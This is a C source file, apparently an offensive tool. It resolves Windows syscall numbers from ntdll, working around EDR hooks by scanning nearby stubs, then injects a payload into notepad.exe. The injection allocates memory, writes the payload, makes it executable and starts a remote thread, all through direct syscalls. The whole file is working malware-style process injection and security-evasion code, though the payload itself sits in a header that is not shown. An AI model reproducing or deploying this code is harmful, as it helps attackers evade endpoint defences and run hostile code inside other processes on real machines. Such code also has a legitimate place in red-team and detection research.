#include <windows.h>
#include <stdio.h>
#include "Defines.h"


DWORD GetHookedSSN( PBYTE pFuncAddr ) {

    DWORD stubCount = 1;
    DWORD SSN = 0;
    PBYTE pOrgFuncAddr = pFuncAddr;

    pFuncAddr -= 0x20;

    do {
        if ( pFuncAddr[ 0 ] == 0x4C
            && pFuncAddr[ 1 ] == 0x8B
            && pFuncAddr[ 2 ] == 0xD1
            && pFuncAddr[ 3 ] == 0xB8
            && pFuncAddr[ 6 ] == 0x00
            && pFuncAddr[ 7 ] == 0x00 ) {
            SSN = *( DWORD* )( pFuncAddr + 4 ) + stubCount;
            printf( "[+] SSN: 0x%X\n", SSN );
            printf( "[+] Found unhooked stub at 0x%p\n", pFuncAddr );
            return SSN;
        }
        else {
            stubCount++;
            pFuncAddr -= 0x20;
        }
    } while ( stubCount < 10 );


    stubCount = 1;
    pOrgFuncAddr += 0x20;

    do {
        if ( pOrgFuncAddr[ 0 ] == 0x4C
            && pOrgFuncAddr[ 1 ] == 0x8B
            && pOrgFuncAddr[ 2 ] == 0xD1
            && pOrgFuncAddr[ 3 ] == 0xB8
            && pOrgFuncAddr[ 6 ] == 0x00
            && pOrgFuncAddr[ 7 ] == 0x00 ) {
            SSN = *( DWORD* )( pOrgFuncAddr + 4 ) - stubCount;
            printf( "[+] Found unhooked stub at 0x%p\n", pOrgFuncAddr );
            return SSN;
        }
        else {
            stubCount++;
            pOrgFuncAddr += 0x20;
        }
    } while ( stubCount < 10 );

    return 0;
}

BOOL GetSyscallInfo( HMODULE hModule, LPCSTR lpFunctionName, PDWORD SSN, PUINT_PTR sysAddr ) {


    PIMAGE_DOS_HEADER pDosHeader = ( PIMAGE_DOS_HEADER )hModule;

    if ( pDosHeader->e_magic != IMAGE_DOS_SIGNATURE ) {
        fprintf( stderr, "[-] Invalid DOS header\n" );
        return FALSE;
    }

    PIMAGE_NT_HEADERS pNtHeaders = ( PIMAGE_NT_HEADERS )( ( PBYTE )hModule + pDosHeader->e_lfanew );

    if ( pNtHeaders->Signature != IMAGE_NT_SIGNATURE ) {
        fprintf( stderr, "[-] Invalid NT header\n" );
        return FALSE;
    }


    PIMAGE_EXPORT_DIRECTORY pExportDirectory = ( PIMAGE_EXPORT_DIRECTORY )( ( PBYTE )hModule + pNtHeaders->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress );

    if ( pExportDirectory->NumberOfNames == 0 ) {
        fprintf( stderr, "[-] No exported functions\n" );
        return FALSE;
    }

    PDWORD pAddressOfNames = ( PDWORD )( ( PBYTE )hModule + pExportDirectory->AddressOfNames );
    PDWORD pAddressOfFunctions = ( PDWORD )( ( PBYTE )hModule + pExportDirectory->AddressOfFunctions );
    PWORD pAddressOfNameOrdinals = ( PWORD )( ( PBYTE )hModule + pExportDirectory->AddressOfNameOrdinals );

    for ( DWORD i = 0; i < pExportDirectory->NumberOfNames; i++ ) {
        LPCSTR pFunctionName = ( LPCSTR )( ( PBYTE )hModule + pAddressOfNames[ i ] );

        PBYTE pFunctionAddress = ( PBYTE )( ( PBYTE )hModule + pAddressOfFunctions[ pAddressOfNameOrdinals[ i ] ] );


        if ( _stricmp( pFunctionName, lpFunctionName ) != 0 ) {
            continue;
        }

        printf( "[+] %s: 0x%p\n", pFunctionName, pFunctionAddress );

        DWORD ssn = 0;
        for ( DWORD j = 0; j < pExportDirectory->NumberOfFunctions; j++ ) {

            if ( pFunctionAddress[ j ] == 0x4C
                && pFunctionAddress[ j + 1 ] == 0x8B
                && pFunctionAddress[ j + 2 ] == 0xD1
                && pFunctionAddress[ j + 3 ] == 0xB8
                && pFunctionAddress[ j + 6 ] == 0x00
                && pFunctionAddress[ j + 7 ] == 0x00 ) {

                ssn = *( DWORD* )( pFunctionAddress + 4 );
                *SSN = ssn;
                *sysAddr = ( UINT_PTR )( pFunctionAddress );
                printf( "[+] SSN: 0x%X\n", ssn );
                return TRUE;
            }
            else {
                printf( "[!] Hooked Found\n" );
                ssn = GetHookedSSN( pFunctionAddress );
                *SSN = ssn;
                *sysAddr = ( UINT_PTR )( pFunctionAddress );
                return TRUE;
            }
        }

    }
    return FALSE;
}


DWORD FindPID( LPCWSTR procName ) {

    NTSTATUS status;
    ULONG returnLength = 0;
    status = Sys_NtQuerySystemInformation( SystemProcessInformation, NULL, 0, &returnLength );

    if ( status != STATUS_INFO_LENGTH_MISMATCH ) {
        printf( "[-] NtQuerySystemInformation failed: 0x%X\n", status );
        return 0;
    }

    PVOID buffer = HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, returnLength );
    if ( !buffer ) {
        printf( "[-] HeapAlloc failed: %d\n", GetLastError() );
        return 0;
    }

    status = Sys_NtQuerySystemInformation( SystemProcessInformation, buffer, returnLength, &returnLength );

    if ( !NT_SUCCESS( status ) ) {
        printf( "[-] NtQuerySystemInformation failed: 0x%X\n", status );
        HeapFree( GetProcessHeap(), 0, buffer );
        return 0;
    }

    DWORD pid = 0;
    PSYSTEM_PROCESS_INFORMATION pInfo = ( PSYSTEM_PROCESS_INFORMATION )buffer;
    while ( TRUE ) {
        if ( pInfo->ImageName.Buffer && _wcsicmp( pInfo->ImageName.Buffer, procName ) == 0 ) {
            pid = ( DWORD )( ULONG_PTR )pInfo->UniqueProcessId;
            break;
        }

        if ( pInfo->NextEntryOffset == 0 ) {
            break;
        }

        pInfo = ( PSYSTEM_PROCESS_INFORMATION )( ( PBYTE )pInfo + pInfo->NextEntryOffset );
    }

    HeapFree( GetProcessHeap(), 0, buffer );
    return pid;
}


BOOL ResolveSyscalls( void ) {

    DWORD ssn = 0;
    UINT_PTR sysAddr = 0;

    HMODULE hNtdll = GetModuleHandleW( L"ntdll.dll" );

    if ( !GetSyscallInfo( hNtdll, "NtAllocateVirtualMemory", &ssn, &sysAddr ) ) {
        printf( "[-] Failed to resolve NtAllocateVirtualMemory\n" );
        return FALSE;
    }

    NtAllocateVirtualMemory_SSN = ssn;
    NtAllocateVirtualMemory_Addr = sysAddr;

    if ( !GetSyscallInfo( hNtdll, "NtWriteVirtualMemory", &ssn, &sysAddr ) ) {
        printf( "[-] Failed to resolve NtWriteVirtualMemory\n" );
        return FALSE;
    }

    NtWriteVirtualMemory_SSN = ssn;
    NtWriteVirtualMemory_Addr = sysAddr;

    if ( !GetSyscallInfo( hNtdll, "NtProtectVirtualMemory", &ssn, &sysAddr ) ) {
        printf( "[-] Failed to resolve NtProtectVirtualMemory\n" );
        return FALSE;
    }

    NtProtectVirtualMemory_SSN = ssn;
    NtProtectVirtualMemory_Addr = sysAddr;

    if ( !GetSyscallInfo( hNtdll, "NtCreateThreadEx", &ssn, &sysAddr ) ) {
        printf( "[-] Failed to resolve NtCreateThreadEx\n" );
        return FALSE;
    }

    NtCreateThreadEx_SSN = ssn;
    NtCreateThreadEx_Addr = sysAddr;

    if ( !GetSyscallInfo( hNtdll, "NtQuerySystemInformation", &ssn, &sysAddr ) ) {
        printf( "[-] Failed to resolve NtQuerySystemInformation\n" );
        return FALSE;
    }

    NtQuerySystemInformation_SSN = ssn;
    NtQuerySystemInformation_Addr = sysAddr;

    return TRUE;
}

int main( void ) {

    if ( !ResolveSyscalls() ) {
        printf( "[-] Failed to resolve syscalls\n" );
        return 1;
    }

    LPCWSTR procName = L"notepad.exe";

    DWORD pid = FindPID( procName );

    if ( !pid ) {
        wprintf( L"[-] Process '%ls' not found.\n", procName );
        return 1;
    }

    wprintf( L"[+] Found process '%ls' with PID: %lu\n", procName, pid );

    HANDLE hProcess = OpenProcess( PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, FALSE, pid );

    if ( !hProcess ) {
        wprintf( L"[-] OpenProcess failed with error: %lu\n", GetLastError() );
        return 1;
    }

    NTSTATUS status;
    PVOID baseAddress = NULL;
    SIZE_T regionSize = ( SIZE_T )payloadSize;
    status = Sys_NtAllocateVirtualMemory( hProcess, &baseAddress, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );

    if ( !NT_SUCCESS( status ) ) {
        wprintf( L"[-] NtAllocateVirtualMemory failed: 0x%X\n", status );
        CloseHandle( hProcess );
        return 1;
    }

    SIZE_T bytesWritten = 0;
    status = Sys_NtWriteVirtualMemory( hProcess, baseAddress, payload, regionSize, &bytesWritten );
    if ( !NT_SUCCESS( status ) ) {
        wprintf( L"[-] NtWriteVirtualMemory failed: 0x%X\n", status );
        CloseHandle( hProcess );
        return 1;
    }

    ULONG oldProtection = 0;
    status = Sys_NtProtectVirtualMemory( hProcess, &baseAddress, &regionSize, PAGE_EXECUTE_READ, &oldProtection );
    if ( !NT_SUCCESS( status ) ) {
        wprintf( L"[-] NtProtectVirtualMemory failed: 0x%X\n", status );
        CloseHandle( hProcess );
        return 1;
    }

    HANDLE hThread;
    status = Sys_NtCreateThreadEx( &hThread, THREAD_ALL_ACCESS, NULL, hProcess, ( PUSER_THREAD_START_ROUTINE )baseAddress, NULL, 0, 0, 0, 0, NULL );
    if ( !NT_SUCCESS( status ) ) {
        wprintf( L"[-] NtCreateThreadEx failed: 0x%X\n", status );
        CloseHandle( hProcess );
        return 1;
    }

    wprintf( L"[+] Successfully injected into '%ls' (PID: %lu)\n", procName, pid );

    CloseHandle( hThread );
    CloseHandle( hProcess );

    return 0;
}